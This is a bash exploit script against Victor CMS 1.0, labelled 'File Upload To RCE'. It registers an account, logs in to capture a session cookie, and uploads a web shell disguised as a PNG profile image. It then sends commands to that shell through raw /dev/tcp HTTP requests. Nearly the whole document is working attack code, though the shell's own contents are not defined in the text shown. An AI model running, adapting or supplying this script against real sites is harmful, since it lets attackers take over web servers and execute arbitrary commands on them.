delimeter="------askjdhfsdkfjhDjkdRLbCdf"

usage() { echo "Usage: $0 [-h <ip address>] [-d <domain>]" 1>&2; exit 0; }

#payload_length( payload string )
function payload_length() {
	local payload=$1
	local tmp=${payload//\\r\\n/\n}
	echo ${#tmp}

}

#build_payload( user_profile string, shell_name string )
function build_payload() {
	local uprofile=$1
	local shell_name=$2
	local login=$(cut -d: -f1 <<<$uprofile)
	local first_name=$(cut -d: -f2 <<<$uprofile)
	local last_name=$(cut -d: -f3 <<<$uprofile)
	local email=$(cut -d: -f4 <<<$uprofile)
	local password=$(cut -d: -f5 <<<$uprofile)
	local cookie="PHPSESSID=$sid"
	local boundary="\r\n--$delimeter\r\n"

	local login_part="${boundary}Content-Disposition:form-data;name=\"user_name\"\r\n\r\n$login"
	local firstname_part="${boundary}Content-Disposition:form-data;name=\"user_firstname\"\r\n\r\n$first_name"
	local lastname_part="${boundary}Content-Disposition:form-data;name=\"user_lastname\"\r\n\r\n$last_name"
	local role_part="${boundary}Content-Disposition:form-data;name=\"user_role\"\r\n\r\nUser"
	local email_part="${boundary}Content-Disposition:form-data; name=\"user_email\"\r\n\r\n$email"
	local file_part="${boundary}Content-Disposition:form-data; name=\"user_image\";filename=\"$shell_name\"\r\nContent-Type: image/png\r\n\r\n$shell_code"
	local password_part="${boundary}Content-Disposition:form-data;name=\"user_password\"\r\n\r\n$password"
	local update_user_part="${boundary}Content-Disposition: form-data; name=\"update_user\"\r\n\r\nUpdate_User"

	local payload="$login_part$firstname_part$lastname_part$file_part$update_user_part$role_part$password_part$email_part\r\n--$delimeter--\r\n"
	echo "$payload"
}

#upload_photo( ip_host string, page_path string, session_id string, user_profile string, shell_name string)
function upload_photo() {
	local host="$1"
	local page_path="$2"
	local sid="$3"
	local uprofile=$4
	local shell_name=$5
	local payload=$(build_payload $uprofile $shell_name)
	local payload_length=$(payload_length "$payload")
	local cookie="PHPSESSID=$sid"

	query="POST $page_path HTTP/1.1\r\nHost: $host\r\nUser-Agent:Mozilla/5.0\r\nConnection: close\r\nContent-Type: multipart/form-data; Boundary=$delimeter\r\nContent-Length: $payload_length\r\nCookie: $cookie\r\n$payload"
	exec 3<>/dev/tcp/$host/80
	printf "$query" >&3
	exec 3<&-
	exec 3>&-
}

#register_user( ip_host string, page_path string,user_profile string )
function register_user() {
	local host="$1"
	local page_path="$2"
	local uprofile="$3"
	local login=$(cut -d: -f1 <<<$uprofile)
	local first_name=$(cut -d: -f2 <<<$uprofile)
	local last_name=$(cut -d: -f3 <<<$uprofile)
	local email=$(cut -d: -f4 <<<$uprofile)
	local password=$(cut -d: -f5 <<<$uprofile)
	exec 3<>/dev/tcp/$host/80
	local payload="user_name=$login&user_firstname=$first_name&user_lastname=$last_name&user_email=$email&user_password=$password&register="
	local query="POST $page_path HTTP/1.1\r\nHost: $host\r\nContent-Length: ${#payload}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n$payload"
	printf "$query" >&3
	head -1 <&3 | cut -d' ' -f2
}

#login_user( ip_host string, domain string, page_path string, user_profile string)
function login_user() {
	local host="$1"
	local domain="$2"
	local page_path="$3"
	local uprofile="$4"
	local login=$(cut -d: -f1 <<<$uprofile)
	local password=$(cut -d: -f5 <<<$uprofile)
	local payload="user_name=$login&user_password=$password&login="
	local query="POST $page_path HTTP/1.1\r\nHost: $host\r\nContent-Length: ${#payload}\r\nConnection:close\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n$payload"

	exec 3<>/dev/tcp/$host/80
	printf "$query" >&3

	read row <&3
	local code=$(cut -d' ' -f2 <<<$row)
	while read row <&3; do
		if [[ $row == *"PHPSESSID"* ]]; then
			local sid=$(sed -r 's/.*=(.*);.*/\1/' <<<$row)
			break
		fi
	done
	exec 3<&-
	exec 3>&-

	echo "$code:$sid"
}

#cmd_shell( host string, domain string, shell_name string, cmd string)
function cmd_shell() {
	local host="$1"
	local domain="$2"
	local shell_name="$3"
	local cmd="$4"
	local payload="cmd=$cmd"
	local query="POST /img/$shell_name HTTP/1.1\r\nHost: $domain\r\nContent-Length: ${#payload}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n$payload"

	exec 3<>/dev/tcp/$host/80
	printf "$query" >&3

	read row <&3
	local code=$(cut -d' ' -f2 <<<$row)
	if [[ $code != "200" ]]; then
		echo "[exec shell] bad request"
		return 1
	fi

	printf "Exploit Title: Victor CMS 1.0 - File Upload To RCE\n"
	echo "------------"
	printf "shell: http://$domain/img/$shell_name\n"
	echo "------------"
	timeout 1 cat <&3

}

